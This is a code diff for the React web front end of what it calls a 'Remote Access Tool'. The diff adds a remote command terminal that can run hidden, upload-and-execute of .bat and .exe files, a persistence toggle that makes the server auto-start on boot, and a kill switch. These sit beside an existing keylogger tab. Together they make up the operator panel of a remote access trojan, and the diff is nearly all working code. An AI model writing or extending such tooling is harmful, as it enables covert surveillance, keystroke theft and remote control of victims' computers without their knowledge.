@@ -40,6 +40,16 @@ const App = () => {
     message: '',
     onConfirm: null
   });
+  
+  // CMD Terminal states
+  const [cmdRunning, setCmdRunning] = useState(false);
+  const [cmdOutput, setCmdOutput] = useState('');
+  const [cmdInput, setCmdInput] = useState('');
+  const [cmdShowWindow, setCmdShowWindow] = useState(false);
+  const [uploadedFile, setUploadedFile] = useState(null);
+  
+  // Persistence state
+  const [persistenceEnabled, setPersistenceEnabled] = useState(false);
 
   // Load saved connection info from localStorage
   useEffect(() => {
@@ -188,6 +198,20 @@ const App = () => {
             setWsPort(data.port);
             setIsDetectingIP(false);
             addLog(`Server IP detected: ${data.ip}:${data.port}`, 'success');
+          }
+          else if (data.type === 'CMD_OUTPUT') {
+            // Real-time CMD output
+            setCmdOutput(prev => prev + data.data);
+          }
+          else if (data.type === 'CMD_STATUS') {
+            setCmdRunning(data.running);
+            if (data.msg) {
+              addLog(data.msg, 'info');
+            }
+          }
+          else if (data.type === 'CMD_PROCESS_ENDED') {
+            setCmdRunning(false);
+            addLog(`Process ended with exit code: ${data.exitCode}`, 'info');
           }
           else if (data.type === 'SCREENSHOT_RESULT') {
             setScreenshotData(data.data);
@@ -359,6 +383,77 @@ const App = () => {
     addLog('Keylog display cleared', 'info');
   };
 
+  // CMD Terminal functions
+  const handleStartCmdSession = () => {
+    setCmdOutput('');
+    sendCommand('CMD_START', { showWindow: cmdShowWindow });
+    addLog('Starting CMD session...', 'info');
+  };
+
+  const handleStopCmdSession = () => {
+    sendCommand('CMD_STOP');
+    addLog('Stopping CMD session...', 'info');
+  };
+
+  const handleKillCmdProcess = () => {
+    showConfirm(
+      '⚠️ Force Kill Process',
+      'Are you sure you want to forcefully terminate the running process?',
+      () => {
+        sendCommand('CMD_KILL');
+        addLog('Killing CMD process...', 'warning');
+      }
+    );
+  };
+
+  const handleSendCommand = () => {
+    if (!cmdInput.trim() || !cmdRunning) return;
+    
+    sendCommand('CMD_EXEC', { command: cmdInput });
+    setCmdOutput(prev => prev + `> ${cmdInput}\n`);
+    setCmdInput('');
+  };
+
+  const handleClearCmdOutput = () => {
+    setCmdOutput('');
+    addLog('CMD output cleared', 'info');
+  };
+
+  const handleFileUpload = (event) => {
+    const file = event.target.files[0];
+    if (file) {
+      setUploadedFile(file);
+      addLog(`File selected: ${file.name}`, 'info');
+    }
+  };
+
+  const handleRunUploadedFile = () => {
+    if (!uploadedFile) {
+      showAlert('⚠️ No File', 'Please upload a file first!');
+      return;
+    }
+
+    // Read file as base64 and send via WebSocket
+    const reader = new FileReader();
+    reader.onload = (e) => {
+      const base64Data = e.target.result.split(',')[1]; // Remove data:xxx;base64, prefix
+      
+      sendCommand('CMD_UPLOAD_RUN', {
+        filename: uploadedFile.name,
+        fileData: base64Data,
+        showWindow: cmdShowWindow
+      });
+      
+      addLog(`Uploading and running: ${uploadedFile.name}`, 'info');
+    };
+    
+    reader.onerror = () => {
+      showAlert('❌ File Read Error', 'Failed to read file');
+    };
+    
+    reader.readAsDataURL(uploadedFile);
+  };
+
   // Start app
   const handleStartApp = () => {
     const name = appInput.trim();
@@ -369,6 +464,38 @@ const App = () => {
     sendCommand('START_PROC', { name: name });
     addLog(`Launching: ${name}`, 'info');
     setAppInput('');
+  };
+
+  // Persistence toggle handler
+  const handleTogglePersistence = () => {
+    if (persistenceEnabled) {
+      // Tắt persistence
+      sendCommand('PERSISTENCE', { mode: 'OFF' });
+      addLog('Disabling persistence...', 'info');
+      setPersistenceEnabled(false);
+    } else {
+      // Bật persistence với confirm
+      showConfirm(
+        '⚠️ Enable Persistence',
+        'Server will auto-start on system boot. Continue?',
+        () => {
+          sendCommand('PERSISTENCE', { mode: 'ON' });
+          addLog('Enabling persistence...', 'info');
+          setPersistenceEnabled(true);
+        }
+      );
+    }
+  };
+
+  const handleKillServer = () => {
+    showConfirm(
+      '⛔ Kill Server',
+      'This will terminate the server process. Are you sure?',
+      () => {
+        sendCommand('KILL_SERVER');
+        addLog('Killing server...', 'warning');
+      }
+    );
   };
 
   // Download handlers
@@ -571,6 +698,22 @@ const App = () => {
           <header className="header">
             <h1>🖥️ Remote Access Tool - Web Client</h1>
             <div className="header-actions">
+              <button 
+                onClick={handleTogglePersistence} 
+                className={`btn ${persistenceEnabled ? 'btn-persist-on' : 'btn-persist-off'}`}
+                disabled={!isConnected}
+                title={persistenceEnabled ? "Disable auto-start" : "Enable auto-start on system boot"}
+              >
+                {persistenceEnabled ? '🔒 Persist ON' : '🔓 Persist OFF'}
+              </button>
+              <button 
+                onClick={handleKillServer} 
+                className="btn btn-kill-server"
+                disabled={!isConnected}
+                title="Terminate server process"
+              >
+                ⛔ Kill Server
+              </button>
               <div className="connection-info">
                 <span className="connection-badge">
                   <span className={`status-indicator ${isConnected ? 'connected' : 'disconnected'}`}></span>
@@ -610,6 +753,12 @@ const App = () => {
               onClick={() => setActiveTab('keylogger')}
             >
               ⌨️ Keylogger
+            </button>
+            <button
+              className={`tab ${activeTab === 'terminal' ? 'active' : ''}`}
+              onClick={() => setActiveTab('terminal')}
+            >
+              💻 CMD Terminal
             </button>
           </div>
 
@@ -957,6 +1106,125 @@ const App = () => {
                     </div>
                   </div>
                 </div>
+              </div>
+            )}
+
+            {activeTab === 'terminal' && (
+              <div className="command-section">
+                <h3>💻 CMD Terminal</h3>
+                
+                {/* Control Panel */}
+                <div className="terminal-controls">
+                  <div className="control-row">
+                    <label className="checkbox-label" title="Show windows when running CMD session or executing uploaded files">
+                      <input
+                        type="checkbox"
+                        checked={cmdShowWindow}
+                        onChange={(e) => setCmdShowWindow(e.target.checked)}
+                        disabled={cmdRunning}
+                      />
+                      <span>Show Terminal Window</span>
+                      <small style={{marginLeft: '8px', color: '#888'}}>
+                        (applies to CMD session & uploaded files)
+                      </small>
+                    </label>
+                    
+                    <div className="status-badge">
+                      Status: <span className={cmdRunning ? 'status-running' : 'status-stopped'}>
+                        {cmdRunning ? '🟢 Running' : '🔴 Stopped'}
+                      </span>
+                    </div>
+                  </div>
+                  
+                  <div className="button-row">
+                    <button 
+                      onClick={handleStartCmdSession} 
+                      className="btn btn-success"
+                      disabled={cmdRunning || !isConnected}
+                    >
+                      ▶️ Start Session
+                    </button>
+                    <button 
+                      onClick={handleStopCmdSession} 
+                      className="btn btn-warning"
+                      disabled={!cmdRunning}
+                    >
+                      ⏹️ Stop Session
+                    </button>
+                    <button 
+                      onClick={handleKillCmdProcess} 
+                      className="btn btn-danger"
+                      disabled={!cmdRunning}
+                    >
+                      ⛔ Force Kill
+                    </button>
+                    <button 
+                      onClick={handleClearCmdOutput} 
+                      className="btn btn-small"
+                    >
+                      🧹 Clear Output
+                    </button>
+                  </div>
+                </div>
+
+                {/* File Upload Section */}
+                <div className="file-upload-section">
+                  <h4>📁 Run .bat or .exe File</h4>
+                  <div className="upload-controls">
+                    <input
+                      type="file"
+                      accept=".bat,.exe,.cmd"
+                      onChange={handleFileUpload}
+                      id="file-upload"
+                      className="file-input"
+                    />
+                    <label htmlFor="file-upload" className="btn btn-upload">
+                      📤 Choose File
+                    </label>
+                    {uploadedFile && (
+                      <span className="file-name">✅ {uploadedFile.name}</span>
+                    )}
+                    <button 
+                      onClick={handleRunUploadedFile} 
+                      className="btn btn-execute"
+                      disabled={!uploadedFile || !isConnected}
+                    >
+                      🚀 Execute File
+                    </button>
+                  </div>
+                </div>
+
+                {/* Terminal Output */}
+                <div className="terminal-output">
+                  <h4>📟 Terminal Output</h4>
+                  <div className="terminal-content">
+                    <pre>{cmdOutput || 'No output yet. Start a session or run a command...'}</pre>
+                  </div>
+                </div>
+
+                {/* Command Input */}
+                {cmdRunning && (
+                  <div className="terminal-input-section">
+                    <h4>⌨️ Execute Command</h4>
+                    <div className="input-group">
+                      <input
+                        type="text"
+                        value={cmdInput}
+                        onChange={(e) => setCmdInput(e.target.value)}
+                        onKeyPress={(e) => e.key === 'Enter' && handleSendCommand()}
+                        placeholder="Enter command (e.g., dir, ipconfig, ping google.com)"
+                        className="terminal-input"
+                      />
+                      <button 
+                        onClick={handleSendCommand} 
+                        className="btn btn-send"
+                        disabled={!cmdInput.trim()}
+                      >
+                        📤 Send
+                      </button>
+                    </div>
+                  </div>
+                )}
               </div>
             )}
           </div>
